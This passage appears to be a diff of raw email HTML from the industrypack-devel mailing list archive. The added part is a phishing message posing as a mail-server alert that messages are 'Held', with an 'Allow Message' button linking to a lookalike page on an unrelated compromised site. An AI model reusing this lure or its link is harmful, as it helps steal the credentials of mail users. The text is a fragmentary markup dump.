+to, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px; min-height: =
+10px;" bgcolor=3D"#c00000">&nbsp;</td>
+                                <td width=3D"4" height=3D"10" style=3D"marg=
+in: 0px; padding: 0px; width: 4px; line-height: 10px; font-family: Roboto, =
+RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px; min-height: 10px=
+;" bgcolor=3D"#ffffff"></td>
+                                <td width=3D"180" height=3D"10" style=3D"ma=
+rgin: 0px; padding: 0px; width: 180px; line-height: 10px; font-family: Robo=
+to, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px; min-height: =
+10px;" bgcolor=3D"#cccccc"></td>
+                                <td width=3D"4" height=3D"10" style=3D"marg=
+in: 0px; padding: 0px; width: 4px; line-height: 10px; font-family: Roboto, =
+RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px; min-height: 10px=
+;" bgcolor=3D"#ffffff"></td>
+                                <td width=3D"180" height=3D"10" style=3D"ma=
+rgin: 0px; padding: 0px; width: 180px; line-height: 10px; font-family: Robo=
+to, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px; min-height: =
+10px;" bgcolor=3D"#cccccc">
+                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;
+                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+ ;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;</td>
+                            </tr>
+                        </tbody>
+                    </table><p style=3D"font-family: arial, sans-serif; mar=
+gin-top: 0px;"><span style=3D"font-size: 16px;"><span style=3D"font-size: 1=
+1pt;"><br>Hello</span>&nbsp;</span>
+industrypack-devel<a style=3D"border-color: rgb(221, 221, 221); text-align:=
+ center; color: rgb(36, 36, 36); text-transform: none; text-indent: 0px; le=
+tter-spacing: normal; font-family: Arial, Helvetica, sans-serif, serif, Emo=
+jiFont; font-size: 14px; font-style: inherit; font-weight: 600; word-spacin=
+g: 0px; white-space: normal; background-color: transparent; text-decoration=
+-style: initial; text-decoration-color: initial;" rel=3D"nofollow noopener =
+noreferrer">
+<span style=3D"color: rgb(59, 59, 59); font-family: Consolas, Courier New, =
+monospace;">,</span></a><br><br><span style=3D"font-size: 12pt;"><span styl=
+e=3D"font-size: 11pt;"><span style=3D"font-size: 13pt;"><span style=3D"font=
+-size: 12pt;"><span style=3D"font-size: 11pt;"> </span></span>
+                        </span>
+                        </span>
+                        </span><span style=3D"font-size: 10pt;"><span style=
+=3D"font-size: 14pt;"><span style=3D"font-size: 12pt;"><span style=3D"font-=
+size: 12pt;"><span style=3D"font-size: 11pt;"><span style=3D"font-size: 13p=
+t;">
+<span style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;">We're rea=
+ching out&nbsp;to let you know that we were unable to deliver&nbsp;some mes=
+sage (s) to your</span></span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+                        </span><br><span style=3D"font-size: 10pt;"><span s=
+tyle=3D"font-size: 14pt;"><span style=3D"font-size: 12pt;"><span style=3D"f=
+ont-size: 12pt;"><span style=3D"font-size: 11pt;"><span style=3D"font-size:=
+ 13pt;"><span style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;email addre=
+ss due to</span></span>
+<span style=3D"color: rgb(214, 40, 40);" dir=3D"ltr">security&nbsp;restrict=
+ions</span></span></span></span></span></span></span><span><span style=3D"f=
+ont-size: 12pt;"><span style=3D"font-size: 11pt;"><span style=3D"font-size:=
+ 13pt;">
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+                        <span style=3D"color: rgb(0, 0, 0);"><span style=3D=
+"font-size: 10pt;"><span style=3D"font-size: 14pt;"><span style=3D"font-siz=
+e: 12pt;"><span style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;"=
+><span style=3D"font-size: 13pt;"><span style=3D"font-size: 12pt;"><span st=
+yle=3D"font-size: 11pt;">on your mail&nbsp;server.</span></span><span style=
+=3D"font-size: 11pt;">
+</span><span style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;">2/=
+25/2026 8:17:11 a.m.</span></span><span style=3D"font-size: 11pt;">&nbsp;</=
+span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+                    </p>
+                    <p style=3D"font-family: arial, sans-serif; margin-top:=
+ 0px;"><span><span style=3D"font-size: 12pt;"><span style=3D"font-size: 12p=
+t;"><span style=3D"font-size: 11pt;"><span style=3D"font-size: 13pt;"><span=
+ style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;">&nbsp; It appe=
+ars that your system settings are currently blocking incoming messages.</sp=
+an></span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20
+                    </p><span style=3D"font-size: 10pt;"><span style=3D"fon=
+t-size: 14pt;"><span style=3D"font-size: 12pt;"><span style=3D"font-size: 1=
+2pt;"><span style=3D"font-size: 11pt;"><span style=3D"font-size: 13pt;"><sp=
+an style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;">
+</span></span>
+                    </span>
+                    </span>
+                    </span>
+                    </span>
+                    </span>
+                    </span>
+                    <p style=3D"margin: 0px 0px 12px;"><span style=3D"font-=
+weight: bolder;"><span style=3D"font-size: 10pt;"><span style=3D"font-size:=
+ 14pt;"><span style=3D"font-size: 12pt;"><span style=3D"font-size: 12pt;"><=
+span style=3D"font-size: 11pt;"><span style=3D"font-size: 13pt;"><span styl=
+e=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;">&nbsp; Account Info=
+rmation:</span></span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+                    </p>
+                    <p style=3D"margin: 0px 0px 12px;">
+                        <span style=3D"font-size: 10pt;"><span style=3D"fon=
+t-size: 14pt;"><span style=3D"font-size: 12pt;"><span style=3D"font-size: 1=
+2pt;"><span style=3D"font-size: 11pt;"><span style=3D"font-size: 13pt;"><sp=
+an style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;">&nbsp;&nbsp;=
+<span style=3D"font-size: 9pt;">Email Address:industrypack-devel@lists.sour=
+ceforge.net</span>
+                            </span>
+                            </span>
+                            </span>
+                            </span>
+                            </span>
+                            </span>
+                            </span>
+                            </span>
+                    </p>
+                    <p style=3D"margin: 0px 0px 12px;">
+                        <span style=3D"font-size: 10pt;"><span style=3D"fon=
+t-size: 14pt;"><span style=3D"font-size: 12pt;"><span style=3D"font-size: 1=
+2pt;"><span style=3D"font-size: 11pt;"><span style=3D"font-size: 13pt;"><sp=
+an style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;">&nbsp;&nbsp;=
+<span style=3D"font-size: 9pt;">Status:</span></span></span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+                        </span><span style=3D"color: rgb(243, 12, 46);"><sp=
+an style=3D"font-size: 10pt;"><span style=3D"font-size: 14pt;"><span style=
+=3D"font-size: 12pt;">
+<span style=3D"font-size: 12pt;"><span style=3D"font-size: 11pt;"><span sty=
+le=3D"font-size: 13pt;"><span style=3D"font-size: 12pt;"><span style=3D"fon=
+t-size: 11pt;"><span style=3D"font-size: 9pt;">Held</span></span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+                        </span>
+                    </p>
+                    <a style=3D'padding: 16px 28px; border-radius: 8px; bor=
+der: 2px solid rgb(220, 62, 19); border-image: none; color: rgb(255, 255, 2=
+55); font-family: "Work Sans", sans-serif; font-size: 16px; font-style: nor=
+mal; font-weight: normal; text-decoration: none; display: inline-block; min=
+-width: 30px; background-color: rgb(220, 62, 19); text-size-adjust: 100%;' =
+href=3D"&#10;https://butzketransportes.com.br/wpcontents/contents/themes/ds=
+fZhWpEdjx6JbghEnytQezRsdur6F3VKavcx.html#industrypack-devel@lists.sourcefor=
+ge.net" target=3D"_blank" rel=3D"noopener noreferrer">Allow Message</a>
+                    <table align=3D"center" style=3D"text-size-adjust: 100%=
+;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+                        <tbody>
+                            <tr style=3D"text-align: center;"></tr>
+                        </tbody>
+                    </table>
+                </td>
+            </tr>
+            <tr>
+                <td class=3D"v1mceSpacing-24" valign=3D"top" style=3D"paddi=
+ng-top: 24px; padding-right: 48px; padding-left: 48px; text-size-adjust: 10=
+0%;">
+                    <div class=3D"v1mceText" style=3D'width: 225px; height:=
+ 16px; text-align: center; color: rgb(0, 0, 0); padding-top: 0px; font-fami=
+ly: "Helvetica Neue", Helvetica, Arial, Verdana, sans-serif; font-size: 16p=
+x; border-top-color: currentColor; border-top-width: 0px; border-top-style:=
+ none;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                        <p class=3D"v1last-child" style=3D'margin: 0px; pad=
+ding: 0px; text-align: center; font-family: "Alegreya Sans", Georgia, "Time=
+s New Roman", serif;'><br></p>
+                    </div>
+                </td>
+            </tr>
+        </tbody>
+    </table>
 
-</body>
-
-</html>
-          <a href=3D"https://u55480361.ct.sendgrid.net/asm/?user_id=3D55480=
-361&amp;data=3D0aiKE6v2JWj1tBd0sRDErTSMh8Qte2mrhcFVYey0P0hoMDAwdTAwMG7m9Tf3=
-W4qxYFSSTQdUqMvJjTTBJfq_NkGfPVZ0rqP8CPVRYhJUo0QQ6q0inS89m2ErJS-Rk9JnsvMGKgM=
-8p8SOfqK3EvEKFeeBWat9l-4vMWkmHquDl-M-vlq8hYTknvqCBfMnehSvWi4gkJalguJbeXzZCT=
--aL3lq9ZI8G5q86WyvbcAQGX39fEqVcZ4ZJETiERD6T6V-j_g_MDfcwZXiNi9fCmVQbFA-7SnYA=
-rNZuCdR-DdlgVTAAHrIcTJGzSL9MVTl_H-F84_1yDtWOohM8F4XoPmdalHoYDxreTqiY7L9MQVr=
-LLI189qmbu9xix25nbJtdSkSL8qD-5xx8a_f_z5v9TQsrGwkpRFHEd2NDNr2MBceUhVnqsvmGxg=
-OXacJ22nYfOpkso1ZZtgGdqNSy9idh2FOc_XxO4tTymZhbyxXzmrnOs-EYi9hCux9Zh211ZxmQy=
-fDAurVyOJ71bU3x6wvFHQiIjxeT4kvRzOAZ24xStTZdXIBzinkFwrWCregdU5mUeybxq4YjYJoa=
-_FW8xvduwcAEcWxTlHiQ-6KVxQVPtad3huRGBE6LKbd6CcFKnhGBkXsYaBDaAbldGJFgL-I6Po4=
-Eb-dNOFEtwcQxgEBiNdAy9Bum9_PZQnddCbuAs_4OOQF4fPM0afNs2KOxc7ML8moJPOunk9CyP6=
-_czB5RZ8NjgLEd_Oe1H8V3FNsdi7hevDfksP5DpRui_MJ6_HdIoQJJNESfeQol0Cm5bl9ApfoT-=
-Vw3BtrEWFTI9Vl6FzAt60wwM6u4Nfp-YcN8R2Giq2plKi_JZ5WwKkuYP5NUDztfgRTaMxZs-X0K=
-27vODv7kdD7xZE0kiBVHKjL75JbBbCswt32DCn-CenTiTcq6M834xvYSsW9bPmkAF0rXyr-2-_T=
-mdF7LUI7ThMbTOi8-Uf__fH4xZP2SnI_4_hiCIfsBOh73DOME7xwgAYFUJ2vp4vQRJNk0lpU70s=
-g_j3_k5b9RXopMtm2g-qy1wXKAStIQxF0CpBa1Q3Ouq-r4zqzJcLrCDl0GI20p3gOQHsBVYHvvr=
-9I_NCgokDNHm8i_v7jqDNkpJXwlYM1Tj31p02aV6_dnQwA3BapTUKUP7Pa0O7lfE8uwcJbZKngE=
-3b7mQUVw3V2G0_x8AqRhw=3D=3D" target=3D"_blank" class=3D"Unsubscribe--unsubs=
-cribePreferences" style=3D"font-family:sans-serif;text-decoration:none;">
-            Unsubscribe Preferences
-          </a>
-        </p>
-      </div>
-    <img src=3D"https://u55480361.ct.sendgrid.net/wf/open?upn=3Du001.HN9ncs=
-wbYi-2BEGN-2FXArB7Yb-2B54Tm43-2B694904Gpq6REDOvMj5jd8r2ODXoOGLI8F0uYDlfdJx8=
-NjvPdhWWcpkCUGsR3P4VRN5MZ7o0veGf3rvT-2BLh1aC66WHXNP3uZ2MXALkHEQ-2BFrCPjUx06=
-NxmFri6-2BXxC4qcLErCGgOmjc8H7v-2FCmxYtULIhFJ4QC6to7foayV4EBAqQsYxBht-2Bmll7=
-APRabwslCZP4xfYoh7IFrCHZmTrNXlEZF5DCrPj7d9ZkrA-2Bcl6X1ciPU-2FDPQEID-2FyKhHo=
-0h6ItnKtXV18RachGLQRfX7OQyu4mzXKRwJFsu-2Fwr696aQFEieog6LSHWWDMCUucfoDdZ5tZN=
-R41DgvOWCYHW53eYNoZTACUxrxewqofEKUDI39cC9HrKhTlhb95V0pGdbstnO7F7k7eAs4LQbeT=
-sqKKL35zCnvjoMOhTDUyBfuK-2FZInx-2FZewI-2BuvGsdx47kgdr-2FD2OqHI0WDE6EJQIL7p2=
-3Fc4y-2BcuEQqI-2FBhBi-2B7jD9-2BLBwUiABNvS0r56-2F-2BghhTnkTLBsmud2AJFR9RJSd7=
-9hsa4xjy1mdLH03GCxwviFKSCt80vnuTGYG648BmcvGsBzpcN5BiwzLz9NV3iFxZ4tQtSy-2BsL=
-eiFk99HgODfJnxXJQYp1YN3omyvTvgB5RY9boeYtZncpaWisVlr1eyTTq4xvByBFgCQMoHrlv54=
-h7b9ZTWqzrVDi8lm-2FLSez9PDJ0IgeAc4kVjxWK5gHNrxde-2B0W8xoasUXIV6gxgoXZSuJmip=
-fBz-2FL1WSPFU-2Flmr8c9EbwtwGRpSTEN3guqwov4sSbjXQGd6-2F5xYxguDU6VcE0twK-2FdO=
--2BkGipi-2FT0lhsNtjhZNtGgZYGIndA-2FauwcJsMF5rDE0JbFgdOyz2P3WwUEqVcapJ2L2g-2=
-FuKvPtBNn5E-2BssBGUc9OTnMikqJHdS9J1ZWDYNX7DJnC3-2Fv6bdbdIuiZPBINys-2BYN1nRw=
-GQvASnAY8pllwXoslxiAvJOO0Vu6tHExFUGcsmZpGm" alt=3D"" width=3D"1" height=3D"=
-1" border=3D"0" style=3D"height:1px !important;width:1px !important;border-=
-width:0 !important;margin-top:0 !important;margin-bottom:0 !important;margi=
-n-right:0 !important;margin-left:0 !important;padding-top:0 !important;padd=
-ing-bottom:0 !important;padding-right:0 !important;padding-left:0 !importan=
-t;"/></body>
-  </html>
-
---5944c7c95bacd7517dd70b5dda60aaa6f14adef6a15fd142bbbab1cc649c--
 
 
---===============7271226722294400277==
+
+</body></html>
+
+
+--===============0234737233541720602==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============7271226722294400277==
+--===============0234737233541720602==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -348,5 +451,4 @@ Industrypack-devel mailing list
 Industrypack-devel@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/industrypack-devel
 
---===============7271226722294400277==--
-
+--===============0234737233541720602==--
